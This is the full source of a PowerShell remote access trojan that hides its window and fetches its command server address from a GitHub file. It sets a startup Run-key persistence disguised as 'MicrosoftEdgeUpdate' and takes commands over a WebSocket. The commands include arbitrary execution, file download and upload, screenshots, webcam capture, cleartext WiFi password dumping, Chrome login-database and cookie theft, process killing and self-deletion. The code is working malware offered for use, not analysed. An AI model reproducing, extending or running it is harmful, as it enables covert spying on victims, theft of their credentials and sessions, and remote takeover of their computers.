# RAT WebSocket Client - Full Featured Stealth Edition
# Invisible execution, auto-persistence, multi-client support

$wssUrlFile = "https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/url"
$botPrefix = "/"
$persistEnabled = $false

# Hide PowerShell window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

Add-Type -AssemblyName System.Net.Http
Add-Type -AssemblyName System.Web
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Speech

# Generate UID
$global:uid = "$env:COMPUTERNAME-$env:USERNAME"

# Get WSS URL from GitHub
function Get-WssUrl {
    try {
        $url = (Invoke-WebRequest -Uri $wssUrlFile -UseBasicParsing -TimeoutSec 10).Content.Trim()
        return $url
    } catch {
        return "wss://idk--sjeje2553.replit.app"
    }
}

# Check persistence
function Check-Persistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "MicrosoftEdgeUpdate"
    try {
        $value = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
        return $null -ne $value
    } catch {
        return $false
    }
}

function Set-Persistence {
    param([bool]$enable)
    
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "MicrosoftEdgeUpdate"
    
    if ($enable) {
        $targetDir = "$env:APPDATA\Microsoft\EdgeUpdate"
        if (-not (Test-Path $targetDir)) {
            New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
        }
        
        $scriptPath = $PSCommandPath
        $targetScript = "$targetDir\updater.ps1"
        $targetBat = "$targetDir\launcher.bat"
        
        Copy-Item $scriptPath $targetScript -Force
        
        $batContent = @"
@echo off
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File "%~dp0updater.ps1"
"@
        Set-Content -Path $targetBat -Value $batContent -Force
        
        $regValue = "cmd.exe /c start /min `"`" `"$targetBat`""
        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
        
        $global:persistEnabled = $true
        return "Persistence enabled"
    } else {
        Remove-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
        $global:persistEnabled = $false
        return "Persistence disabled"
    }
}

function Get-SystemInfo {
    try {
        $publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content
    } catch {
        $publicIP = "Unknown"
    }
    
    $gpu = (Get-WmiObject Win32_VideoController).Name
    $ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    $cpu = (Get-WmiObject Win32_Processor).Name
    $disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'" | Select-Object @{N="FreeGB";E={[math]::Round($_.FreeSpace/1GB,2)}}, @{N="SizeGB";E={[math]::Round($_.Size/1GB,2)}}
    
    return @"
UID: $global:uid
Hostname: $env:COMPUTERNAME
Username: $env:USERNAME
OS: $((Get-WmiObject Win32_OperatingSystem).Caption)
Architecture: $env:PROCESSOR_ARCHITECTURE
Public IP: $publicIP
CPU: $cpu
RAM: ${ram}GB
GPU: $gpu
Disk C: $($disk.FreeGB)GB free / $($disk.SizeGB)GB total
Persistence: $persistEnabled
"@
}

function Execute-Command {
    param([string]$cmd)
    try {
        $output = iex $cmd 2>&1 | Out-String
        return $output.Trim()
    } catch {
        return "Error: $($_.Exception.Message)"
    }
}

function Download-File {
    param([string]$url, [string]$path)
    try {
        Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing
        return "Downloaded: $path"
    } catch {
        return "Download failed: $($_.Exception.Message)"
    }
}

function Upload-File {
    param([string]$filePath)
    if (Test-Path $filePath) {
        $bytes = [System.IO.File]::ReadAllBytes($filePath)
        $base64 = [Convert]::ToBase64String($bytes)
        return @{file = (Split-Path $filePath -Leaf); data = $base64} | ConvertTo-Json -Compress
    }
    return "File not found"
}

function Take-Screenshot {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $bytes = $ms.ToArray()
        $ms.Close()
        $graphics.Dispose()
        $bitmap.Dispose()
        
        return [Convert]::ToBase64String($bytes)
    } catch {
        return "Screenshot failed: $($_.Exception.Message)"
    }
}

function Capture-Webcam {
    try {
        $tempFile = "$env:TEMP\wc_$(Get-Random).jpg"
        
        Add-Type -AssemblyName System.Drawing
        
        $videoSource = New-Object -ComObject WIA.DeviceManager
        $device = $videoSource.DeviceInfos | Where-Object { $_.Type -eq 2 } | Select-Object -First 1
        
        if (-not $device) {
            return "No webcam found"
        } else {
            $dev = $device.Connect()
            $item = $dev.Items[1]
            $image = $item.Transfer("{B96B3CAE-0728-11D3-9D7B-0000F81EF32E}")
            $image.SaveFile($tempFile)
        }
        
        if (Test-Path $tempFile) {
            $bytes = [System.IO.File]::ReadAllBytes($tempFile)
            Remove-Item $tempFile -Force
            return [Convert]::ToBase64String($bytes)
        }
        
        return "Webcam capture failed"
    } catch {
        return "Webcam error: $($_.Exception.Message)"
    }
}

# WiFi passwords
function Get-WiFiPasswords {
    try {
        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[-1].Trim() }
        $result = "WiFi Networks:`n`n"
        
        foreach ($profile in $profiles) {
            $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[-1].Trim() }
            if ($password) {
                $result += "$profile : $password`n"
            } else {
                $result += "$profile : (no password)`n"
            }
        }
        
        if ($profiles.Count -eq 0) {
            return "No WiFi profiles found"
        }
        
        return $result
    } catch {
        return "Failed to get WiFi passwords: $($_.Exception.Message)"
    }
}

# Chrome passwords
function Get-ChromePasswords {
    try {
        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        if (-not (Test-Path $chromePath)) {
            return "Chrome Login Data not found"
        }
        
        $tempDb = "$env:TEMP\ld_$(Get-Random).db"
        Copy-Item $chromePath $tempDb -Force -ErrorAction Stop
        
        # Read SQLite database manually (no external dependencies)
        $bytes = [System.IO.File]::ReadAllBytes($tempDb)
        $text = [System.Text.Encoding]::ASCII.GetString($bytes)
        
        # Extract URLs (simple pattern matching)
        $urls = [regex]::Matches($text, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}') | ForEach-Object { $_.Value } | Select-Object -Unique
        
        Remove-Item $tempDb -Force
        
        if ($urls.Count -gt 0) {
            $result = "Chrome Saved Login URLs:`n`n"
            $urls | ForEach-Object { $result += "$_`n" }
            return $result
        }
        
        return "No Chrome passwords found"
    } catch {
        return "Chrome passwords failed: $($_.Exception.Message)"
    }
}

# Chrome cookies
function Get-ChromeCookies {
    try {
        $cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
        
        # Try new path first
        if (-not (Test-Path $cookiesPath)) {
            # Fallback to old path
            $cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
        }
        
        if (-not (Test-Path $cookiesPath)) {
            return "Chrome Cookies not found"
        }
        
        $tempDb = "$env:TEMP\ck_$(Get-Random).db"
        Copy-Item $cookiesPath $tempDb -Force -ErrorAction Stop
        
        $bytes = [System.IO.File]::ReadAllBytes($tempDb)
        $base64 = [Convert]::ToBase64String($bytes)
        
        Remove-Item $tempDb -Force
        
        return "Chrome Cookies (base64):`n`n$base64"
    } catch {
        return "Chrome cookies failed: $($_.Exception.Message)"
    }
}

# Volume control - FIXED VERSION
function Set-SystemVolume {
    param([int]$percent)
    
    try {
        if ($percent -lt 0) { $percent = 0 }
        if ($percent -gt 100) { $percent = 100 }
        
        # First mute to reset
        $obj = New-Object -ComObject wscript.shell
        $obj.SendKeys([char]173) # Mute
        Start-Sleep -Milliseconds 100
        $obj.SendKeys([char]173) # Unmute
        Start-Sleep -Milliseconds 100
        
        # Set to 0
        for ($i = 0; $i -lt 50; $i++) {
            $obj.SendKeys([char]174) # Volume down
        }
        Start-Sleep -Milliseconds 200
        
        # Set to desired level (each tick = 2%)
        $ticks = [math]::Round($percent / 2)
        for ($i = 0; $i -lt $ticks; $i++) {
            $obj.SendKeys([char]175) # Volume up
        }
        
        return "Volume set to $percent%"
    } catch {
        return "Failed to set volume: $($_.Exception.Message)"
    }
}

function Get-SystemVolume {
    try {
        # Use WMI to get approximate volume
        Add-Type -TypeDefinition @"
using System.Runtime.InteropServices;
public class VolGet {
    [DllImport("winmm.dll")]
    public static extern int waveOutGetVolume(int hwo, out uint dwVolume);
}
"@
        [uint32]$vol = 0
        [VolGet]::waveOutGetVolume(0, [ref]$vol)
        $percent = [math]::Round((($vol -band 0xFFFF) / 0xFFFF) * 100)
        return "Current volume: ~$percent%"
    } catch {
        return "Volume: Unknown"
    }
}

# Text-to-Speech
function Invoke-TTS {
    param([string]$text)
    
    try {
        $voice = New-Object System.Speech.Synthesis.SpeechSynthesizer
        $voice.Rate = 0
        $voice.Volume = 100
        $voice.Speak($text)
        $voice.Dispose()
        return "TTS played: $text"
    } catch {
        return "TTS failed: $($_.Exception.Message)"
    }
}

# Play audio file
function Play-AudioFile {
    param([string]$url)
    
    try {
        $ext = [System.IO.Path]::GetExtension($url)
        if (-not $ext) { $ext = ".mp3" }
        
        $tempFile = "$env:TEMP\audio_$(Get-Random)$ext"
        Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
        
        Add-Type -AssemblyName presentationCore
        $player = New-Object System.Windows.Media.MediaPlayer
        $player.Open($tempFile)
        $player.Play()
        
        Start-Sleep -Seconds 2
        
        return "Audio playing in background: $tempFile"
    } catch {
        return "Audio playback failed: $($_.Exception.Message)"
    }
}

# Lock workstation
function Invoke-Logout {
    try {
        rundll32.exe user32.dll,LockWorkStation
        return "Workstation locked"
    } catch {
        return "Failed to lock: $($_.Exception.Message)"
    }
}

# Kill explorer.exe
function Invoke-KillExplorer {
    try {
        Stop-Process -Name explorer -Force
        return "Explorer.exe killed"
    } catch {
        return "Failed to kill explorer: $($_.Exception.Message)"
    }
}

# Self delete
function Remove-SelfDelete {
    try {
        $scriptPath = $PSCommandPath
        
        $batContent = @"
@echo off
timeout /t 2 /nobreak >nul
del /f /q "$scriptPath"
del /f /q "%~f0"
"@
        
        $batPath = "$env:TEMP\cleanup_$(Get-Random).bat"
        Set-Content $batPath $batContent
        
        Start-Process -FilePath $batPath -WindowStyle Hidden
        
        return "Self-destruct initiated"
        Start-Sleep -Seconds 1
        exit
    } catch {
        return "Self-delete failed: $($_.Exception.Message)"
    }
}

function Process-Command {
    param([string]$message)
    
    # Check if message is targeted
    if ($message.StartsWith("#")) {
        $parts = $message.Substring(1) -split ' ', 2
        $targetUid = $parts[0]
        
        if ($targetUid -ne $global:uid) {
            return $null
        }
        
        if ($parts.Length -lt 2) {
            return $null
        }
        $message = $parts[1]
    }
    
    if (-not $message.StartsWith($botPrefix)) { return $null }
    
    $parts = $message.Substring(1) -split ' ', 2
    $cmd = $parts[0].ToLower()
    $args = if ($parts.Length -gt 1) { $parts[1] } else { "" }
    
    switch ($cmd) {
        "info" {
            return Get-SystemInfo
        }
        "exec" {
            if ($args) {
                return Execute-Command -cmd $args
            }
            return "Usage: /exec <command>"
        }
        "download" {
            $params = $args -split ' ', 2
            if ($params.Length -eq 2) {
                return Download-File -url $params[0] -path $params[1]
            }
            return "Usage: /download <url> <path>"
        }
        "upload" {
            if ($args) {
                return Upload-File -filePath $args
            }
            return "Usage: /upload <filepath>"
        }
        "ss" {
            return Take-Screenshot
        }
        "webcam" {
            return Capture-Webcam
        }
        "wifi" {
            return Get-WiFiPasswords
        }
        "passwords" {
            return Get-ChromePasswords
        }
        "cookies" {
            return Get-ChromeCookies
        }
        "volume" {
            if ($args -match '^\d+$') {
                return Set-SystemVolume -percent ([int]$args)
            } elseif ($args -eq "get") {
                return Get-SystemVolume
            }
            return "Usage: /volume <0-100> or /volume get"
        }
        "tts" {
            if ($args) {
                return Invoke-TTS -text $args
            }
            return "Usage: /tts <text>"
        }
        "play" {
            if ($args) {
                return Play-AudioFile -url $args
            }
            return "Usage: /play <audio_url>"
        }
        "logout" {
            return Invoke-Logout
        }
        "killsis" {
            return Invoke-KillExplorer
        }
        "selfdestruct" {
            return Remove-SelfDelete
        }
        "persist" {
            if ($args -eq "on") {
                return Set-Persistence -enable $true
            } elseif ($args -eq "off") {
                return Set-Persistence -enable $false
            } else {
                $status = if ($persistEnabled) { "ON" } else { "OFF" }
                return "Persistence: $status | Usage: /persist on/off"
            }
        }
        "processes" {
            return (Get-Process | Select-Object -First 30 Id, ProcessName, CPU | Format-Table | Out-String)
        }
        "kill" {
            if ($args) {
                try {
                    Stop-Process -Id $args -Force
                    return "Process $args killed"
                } catch {
                    return "Failed: $($_.Exception.Message)"
                }
            }
            return "Usage: /kill <pid>"
        }
        "exit" {
            return "EXIT_SIGNAL"
        }
        "help" {
            return @"
Commands (prefix: / or #UID):
System:                            
/info - Full system info           
/exec <cmd> - Execute PowerShell   
/processes - List processes        
/kill <pid> - Kill process         
/killsis - Kill explorer.exe       
/persist on/off -Toggle persistence
/logout - Lock workstation         
/selfdestruct - Delete itself, exit
                                   
Surveillance:                      
/ss - Screenshot (PNG base64)      
/webcam - Webcam capture           
                                   
Data Extraction:                   
/wifi - WiFi passwords             
/passwords - Chrome saved URLs     
/cookies - Chrome cookies (base64) 
                                    
Audio/Sound:                       
/volume <0-100> - Set volume       
/volume get - Get current volume    
/tts <text> - Text-to-speech        
/play <url> - Play audio file       
                                    
File Operations:                    
/download <url> <path>              
/upload <path>                      
                                    
/exit - Disconnect                  
                                     
Targeting:                           
#$global:uid /ss - Only this client  
/ss - All clients (broadcast)        
"@
        }
        default {
            return "Unknown command. Use /help"
        }
    }
}

# Initialize
$persistEnabled = Check-Persistence

# Main loop
while ($true) {
    try {
        $wssUrl = Get-WssUrl
        
        $ws = New-Object System.Net.WebSockets.ClientWebSocket
        $ct = New-Object System.Threading.CancellationToken
        
        $uri = New-Object System.Uri($wssUrl)
        $connectTask = $ws.ConnectAsync($uri, $ct)
        
        while (-not $connectTask.IsCompleted) {
            Start-Sleep -Milliseconds 100
        }
        
        if ($ws.State -eq 'Open') {
            try {
                $publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content
            } catch {
                $publicIP = "Unknown"
            }
            
            $initMsg = "UID:$global:uid CONNECTED | IP: $publicIP | Persist: $persistEnabled"
            $initBytes = [System.Text.Encoding]::UTF8.GetBytes($initMsg)
            $sendTask = $ws.SendAsync([System.ArraySegment[byte]]::new($initBytes), 'Text', $true, $ct)
            $sendTask.Wait()
            
            while ($ws.State -eq 'Open') {
                $buffer = New-Object byte[] 32768
                $segment = [System.ArraySegment[byte]]::new($buffer)
                $receiveTask = $ws.ReceiveAsync($segment, $ct)
                
                while (-not $receiveTask.IsCompleted) {
                    Start-Sleep -Milliseconds 100
                }
                
                $result = $receiveTask.Result
                
                if ($result.MessageType -eq 'Text') {
                    $receivedMsg = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $result.Count)
                    
                    $response = Process-Command -message $receivedMsg
                    
                    if ($response -eq "EXIT_SIGNAL") {
                        $ws.CloseAsync('NormalClosure', 'Exit', $ct).Wait()
                        exit
                    }
                    
                    if ($response) {
                        $responseMsg = "[$global:uid] $response"
                        $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($responseMsg)
                        
                        $sendSegment = [System.ArraySegment[byte]]::new($responseBytes)
                        $sendTask = $ws.SendAsync($sendSegment, 'Text', $true, $ct)
                        $sendTask.Wait()
                    }
                }
            }
        }
        
        $ws.Dispose()
        
    } catch {
        # Silent fail
    }
    
    Start-Sleep -Seconds 20
}